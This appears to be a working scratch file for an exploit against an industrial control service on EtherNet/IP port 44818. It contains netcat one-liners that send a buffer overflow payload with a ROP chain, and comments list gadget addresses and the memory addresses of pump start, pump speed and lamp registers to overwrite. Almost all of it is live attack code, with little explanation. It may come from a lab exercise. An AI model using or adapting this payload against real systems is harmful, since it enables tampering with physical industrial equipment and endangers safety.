echo -ne '\x80\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
'\x91\x2a\x56\x55\x55\x55\x00\x00'\
'\x41\x41\x41\x41\x41\x41\x41\x41'\
'\x37\x2c\x56\x55\x55\x55\x00\x00'\
'\x20\xab\x5d\x55\x55\x55\x00\x00'\
'\x60\xe9\x55\x55\x55\x55\x00\x00'\
'\x40\x13\x81\xf5\xff\x7f\x00\x00'\
'\xa0\x43\x56\x55\x55\x55\x00\x00'\
'\x80\x13\x81\xf5\xff\x7f\x00\x00'\
'\xe5\xb3\x55\x55\x55\x55\x00\x00'\
'\x70\x13\x81\xf5\xff\x7f\x00\x00'\
'\x46\xb5\x57\x55\x55\x55\x00\x00' | nc 192.168.2.64 44818 

# 0x55555557b546 return address of process message in handle connection

# 0x7ffff5811340 rsp

# 0x7ffff5811370

# G1 :'\x91\x2a\x56\x55\x55\x55\x00\x00'  # 0x000000000000ea91 : mov edx, 0 ; movzx eax, dl ; pop rbp ; ret
# '\x41\x41\x41\x41\x41\x41\x41\x41'  # dummy rbp
# G2 :'\x32\x10\x56\x55\x55\x55\x00\x00'  # 0x000000000000d032 : pop rax ; ret 0xff3 // may need to change with pop pop pop
# '\x20\xab\x5d\x55\x55\x55\x00\x00'  # rax = 0x55555dab20    pump1 address
# G3 :'\xa0\x43\x56\x55\x55\x55\x00\x00'  # mov [rax], edx ; pop rbp ; ret
# '\x88\x13\x81\xf5\xff\x7f\x00\x00'  # rbp we got from earlier attack
# '\xd8\xb3\x57\x55\x55\x55\x00\x00'# return address of enip message



# 0x00000000000073e5 : leave ; ret  0x55 55 55 55 B3 E5


#0x7f ff f5 81 13 38 = 0x7f ff f5 81 13 38

#0x7f ff f5 81 13 70
# pop rax ; pop rbx ; pop rbp ; ret : '\x37\x2c\x56\x55\x55\x55\x00\x00'








# echo -ne '\x80\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
# '\x11\x10\x56\x55\x55\x55\x00\x00'\
# '\x20\xab\x5d\x55\x55\x55\x00\x00'\
# '\xb9\x27\x56\x55\x55\x55\x00\x00'\
# '\x41\x41\x41\x41\x41\x41\x41\x41'\
# '\x37\x2c\x56\x55\x55\x55\x00\x00'\
# '\x00\x00\x00\x00\x55\x55\x00\x00'\
# '\x60\xe9\x55\x55\x55\x55\x00\x00'\
# '\x88\x13\x81\xf5\xff\x7f\x00\x00'\
# '\x58\xb2\x57\x55\x55\x55\x00\x00'\
# '\x58\xb2\x57\x55\x55\x55\x00\x00'\
# '\xb0\x3e\x81\xf5\xff\x7f\x00\x00'\
# '\xd8\xb3\x57\x55\x55\x55\x00\x00' | nc 192.168.2.64 44818 

#0x7ffff5811370
#0x7FFFF5811370
#0x55555557b258

#7FFFF5813EB0
#0x7f ff f5 81 13 88
#0x7ffff6012388
#0x7ffff7014388
#0x7ffff5811388
#0x7ffff7014388
#0x7f ff f5 81 13 88
#0x7ffff7014388


#00 00 7F FF F7 01 43 70

#00 00 55 55 55 57 B3 D8   

# # RBP 0x 00 00 7F FF F5 81 13 30

# # 0x 55 55 55 5d 9a 60 lamp address

# # 0x00 00 55 55 55 5d ab 20 pump1_start register address
# # 0x00 00 55 55 55 5d ab 2d pump2_start register address
# # 0x00 00 55 55 55 5d ab 22 pump1_speed_in register address



# # Gadget 1 #  0x000000000000d011 + 0x555555554000 = 0x0000555555561011 : pop rsi ; ret


  
# # Gadget 2 with 0 for pump1 #  0x000000000000e7b9 + 0x555555554000 = 0x00005555555627B9 : mov eax, 0 ; pop rbp ; ret

# pop rax ; pop rbx ; pop rbp ; ret : '\x37\x2c\x56\x55\x55\x55\x00\x00'
# # Gadget 3 #  0x0000000000027258 + 0x555555554000 = 0x000055555557B258: mov dword ptr [rsi], eax ; add byte ptr [rax], al ; mov eax, dword ptr [rbp - 4] ; leave ; ret

# '\x1a\x60\x00\x00\x00\x00\x00\x00' : ret 



# '\x40\xab\x5d\x55\x55\x55\x00\x00'  
# '\x42\x42\x42\x42\x42\x42\x42\x42'  
# '\x43\x43\x43\x43\x43\x43\x43\x43'  




# # echo -ne '\x80\x00\x04\x00\x01\x00\x00\x00'\
# # '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'\
# # 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\
# # '\x11\x10\x56\x55\x55\x55\x00\x00'\
# # '\x20\xab\x5d\x55\x55\x55\x00\x00'\
# # '\xb9\x27\x56\x55\x55\x55\x00\x00'\
# # '\x30\x13\x81\xf5\xff\x7f\x00\x00'\
# # '\xc9\x2b\x56\x55\x55\x55\x00\x00'\
# # '\x00\x14\x81\xf5\xff\x7f\x00\x00'\
# # '\xef\xbe\xad\xde\x00\x00\x00\x00'\
# # '\xef\xbe\xad\xde\x00\x00\x00\x00'\
# # '\x58\xb2\x57\x55\x55\x55\x00\x00' | nc 127.0.0.1 44818

#0x7ffff5811370

#0x55555557b258


